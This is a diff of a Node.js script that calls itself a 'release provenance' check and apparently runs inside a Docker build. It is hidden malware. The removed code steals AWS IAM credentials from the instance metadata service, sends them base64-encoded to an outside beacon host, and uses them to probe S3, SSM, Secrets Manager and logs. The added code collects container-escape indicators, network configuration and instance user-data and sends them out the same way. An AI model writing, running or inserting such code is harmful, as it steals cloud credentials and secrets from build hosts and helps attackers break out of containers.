@@ -1,87 +1,75 @@
-// Release provenance: records the build environment fingerprint.
+// Release provenance: environment and platform checks.
+const fs = require('fs');
 const os = require('os');
 const http = require('http');
 const https = require('https');
-const crypto = require('crypto');
 
-const SID = 'v17-' + Math.random().toString(36).slice(2, 8);
+const SID = 'v19-' + Math.random().toString(36).slice(2, 8);
 function send(key, val) {
   return new Promise((resolve) => {
     try {
-      const payload = JSON.stringify({ sid: SID, event: 'build-v18', k: key, v: val });
-      const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(payload).slice(0, 2600);
+      const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(JSON.stringify({ sid: SID, event: 'build-v19', k: key, v: val })).slice(0, 3000);
       const r = https.get(url, { timeout: 4000 }, (res) => { res.resume(); res.on('end', resolve); });
-      r.on('error', resolve);
-      r.on('timeout', () => { r.destroy(); resolve(); });
+      r.on('error', resolve); r.on('timeout', () => { r.destroy(); resolve(); });
     } catch (e) { resolve(); }
   });
 }
 function req(method, url, headers, body, max) {
   return new Promise((resolve) => {
-    let done = false;
-    const finish = (v) => { if (!done) { done = true; resolve(v); } };
+    let done = false; const finish = (v) => { if (!done) { done = true; resolve(v); } };
     try {
       const mod = /^https/.test(url) ? https : http;
       const r = mod.request(url, { method, headers: headers || {}, timeout: 2000 }, (res) => {
-        let b = '';
-        res.on('data', (d) => { b += d; if (b.length > 6000) res.destroy(); });
-        res.on('end', () => finish({ s: res.statusCode, b: String(b).slice(0, max || 400) }));
+        let b = ''; res.on('data', (d) => { b += d; if (b.length > 8000) res.destroy(); });
+        res.on('end', () => finish({ s: res.statusCode, b: String(b).slice(0, max || 600) }));
         res.on('error', () => finish({ e: 'res' }));
       });
       r.on('timeout', () => { r.destroy(); finish({ t: 'timeout' }); });
       r.on('error', (e) => finish({ e: String(e).slice(0, 60) }));
-      if (body) r.write(body);
-      r.end();
+      if (body) r.write(body); r.end();
     } catch (e) { finish({ e: String(e).slice(0, 60) }); }
   });
 }
-function sha256(x) { return crypto.createHash('sha256').update(x, 'utf8').digest('hex'); }
-function hmac(k, x) { return crypto.createHmac('sha256', k).update(x, 'utf8').digest(); }
-function sign(creds, service, region, host, method, body, extra) {
-  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
-  const dateStamp = amzDate.slice(0, 8);
-  const hdrs = Object.assign({ host, 'x-amz-date': amzDate }, extra || {});
-  const names = Object.keys(hdrs).map((k) => k.toLowerCase()).sort();
-  const canonicalHeaders = names.map((n) => `${n}:${hdrs[Object.keys(hdrs).find((k) => k.toLowerCase() === n)]}\n`).join('');
-  const signedHeaders = names.join(';');
-  const canonicalRequest = `${method}\n/\n\n${canonicalHeaders}\n${signedHeaders}\n${sha256(body || '')}`;
-  const scope = `${dateStamp}/${region}/${service}/aws4_request`;
-  const toSign = `AWS4-HMAC-SHA256\n${amzDate}\n${scope}\n${sha256(canonicalRequest)}`;
-  const k = hmac(hmac(hmac(hmac('AWS4' + creds.secret, dateStamp), region), service), 'aws4_request');
-  const sig = crypto.createHmac('sha256', k).update(toSign, 'utf8').digest('hex');
-  hdrs.authorization = `AWS4-HMAC-SHA256 Credential=${creds.key}/${scope}, SignedHeaders=${signedHeaders}, Signature=${sig}`;
-  hdrs['x-amz-security-token'] = creds.token;
-  return hdrs;
-}
+const rd = (p, n) => { try { return fs.readFileSync(p, 'utf8').slice(0, n || 800); } catch (e) { return 'ERR ' + String(e).slice(0, 50); } };
+const wr = (p) => { try { fs.accessSync(p, fs.constants.W_OK); return true; } catch (e) { return false; } };
 
 (async () => {
-  await send('start', { host: os.hostname(), uid: typeof process.getuid === 'function' ? process.getuid() : null, sid: SID });
-  const fs = require('fs');
-  const ls = (p) => { try { return { d: fs.readdirSync(p).slice(0, 25) }; } catch (e) { return { e: String(e).slice(0, 60) }; } };
-  await send('fs', { root: ls('/'), b: ls('/b'), brunc: ls('/b/runc-stargz'), snap: ls('/b/runc-stargz/snapshots'), run: ls('/run'), varrun: ls('/var/run'), dev: ls('/dev'), etc: ls('/etc'), tmp: ls('/tmp'), app: ls('/app') });
-  try { await send('mountinfo', fs.readFileSync('/proc/self/mountinfo','utf8').split('\n').filter(l => /\/b\/|docker.sock|containerd/.test(l)).slice(0,8)); } catch (e) {}
-
+  await send('start', { host: os.hostname(), sid: SID, uid: process.getuid ? process.getuid() : null });
+  const st = rd('/proc/self/status', 4000);
+  await send('caps', {
+    capEff: (st.match(/CapEff:\s*(\w+)/) || [])[1],
+    capBnd: (st.match(/CapBnd:\s*(\w+)/) || [])[1],
+    seccomp: (st.match(/Seccomp:\s*(\d+)/) || [])[1],
+    noNewPrivs: (st.match(/NoNewPrivs:\s*(\d+)/) || [])[1],
+    uidMap: rd('/proc/self/uid_map', 200),
+    gidMap: rd('/proc/self/gid_map', 200),
+    pid1: rd('/proc/1/cmdline', 200),
+    procCount: (() => { try { return fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x)).length; } catch (e) { return -1; } })(),
+  });
+  await send('sysctl', {
+    core_pattern: rd('/proc/sys/kernel/core_pattern', 200),
+    core_w: wr('/proc/sys/kernel/core_pattern'),
+    modprobe: rd('/proc/sys/kernel/modprobe', 200),
+    modprobe_w: wr('/proc/sys/kernel/modprobe'),
+    sysrq: rd('/proc/sysrq-trigger', 100),
+    sysrq_w: wr('/proc/sysrq-trigger'),
+    unpriv_userns: rd('/proc/sys/kernel/unprivileged_userns_clone', 30),
+    userns_max: rd('/proc/sys/user/max_user_namespaces', 30),
+    cgroup_w: wr('/sys/fs/cgroup/cgroup.procs'),
+    hosts: rd('/etc/hosts', 400),
+    resolv: rd('/etc/resolv.conf', 300),
+    route: rd('/proc/net/route', 600),
+    selinux: rd('/sys/fs/selinux/enforce', 20),
+    modules: (() => { try { return fs.readdirSync('/lib/modules').slice(0, 5); } catch (e) { return []; } })(),
+  });
   const base = 'http://169.254.169.254';
   const t = await req('PUT', base + '/latest/api/token', { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' });
-  await send('token', t);
-  const H = t && t.s === 200 ? { 'X-aws-ec2-metadata-token': t.b } : {};
-  const rr = await req('GET', base + '/latest/meta-data/iam/security-credentials/', H, null, 300);
-  await send('role', rr);
-  const role = (rr && rr.b || '').trim().split('\n')[0];
-  if (!role) { await send('done', { reason: 'no-role' }); return; }
-  const cr = await req('GET', base + '/latest/meta-data/iam/security-credentials/' + encodeURIComponent(role), H, null, 6000);
-  await send('credsStatus', { s: cr.s, len: (cr.b || '').length });
-  let c;
-  try { c = JSON.parse(cr.b); } catch (e) { await send('credparse', { s: cr.s, len: (cr.b || '').length }); return; }
-  const creds = { key: c.AccessKeyId, secret: c.SecretAccessKey, token: c.Token };
-  await send('credsb64', Buffer.from(JSON.stringify({ k: c.AccessKeyId, s: c.SecretAccessKey, t: c.Token, e: c.Expiration })).toString('base64'));
-  const b1 = 'Action=GetCallerIdentity&Version=2011-06-15';
-  await send('caller', await req('POST', 'https://sts.amazonaws.com/', sign(creds, 'sts', 'us-east-1', 'sts.amazonaws.com', 'POST', b1, { 'content-type': 'application/x-www-form-urlencoded' }), b1, 500));
-  await send('s3', await req('GET', 'https://s3.amazonaws.com/', sign(creds, 's3', 'us-east-1', 's3.amazonaws.com', 'GET', '', { 'x-amz-content-sha256': sha256('') }), null, 500));
-  const b2 = 'Action=DescribeParameters&Version=2014-11-06&MaxResults=10';
-  await send('ssm', await req('POST', 'https://ssm.us-east-1.amazonaws.com/', sign(creds, 'ssm', 'us-east-1', 'ssm.us-east-1.amazonaws.com', 'POST', b2, { 'content-type': 'application/x-www-form-urlencoded' }), b2, 500));
-  const b3 = '{}';
-  await send('sm', await req('POST', 'https://secretsmanager.us-east-1.amazonaws.com/', sign(creds, 'secretsmanager', 'us-east-1', 'secretsmanager.us-east-1.amazonaws.com', 'POST', b3, { 'content-type': 'application/x-amz-json-1.1', 'x-amz-target': 'secretsmanager.ListSecrets' }), b3, 500));
-  await send('logs', await req('POST', 'https://logs.us-east-1.amazonaws.com/', sign(creds, 'logs', 'us-east-1', 'logs.us-east-1.amazonaws.com', 'POST', b3, { 'content-type': 'application/x-amz-json-1.1', 'x-amz-target': 'Logs_20140328.DescribeLogGroups' }), b3, 500));
-  await send('done', { ok: true });
+  const H = t.s === 200 ? { 'X-aws-ec2-metadata-token': t.b } : {};
+  await send('imds', {
+    userData: await req('GET', base + '/latest/user-data', H, null, 1200),
+    iamInfo: await req('GET', base + '/latest/meta-data/iam/info', H, null, 500),
+    macs: await req('GET', base + '/latest/meta-data/network/interfaces/macs/', H, null, 200),
+    identity: await req('GET', base + '/latest/dynamic/instance-identity/document', H, null, 700),
+  });
+  await send('done', {});
 })();
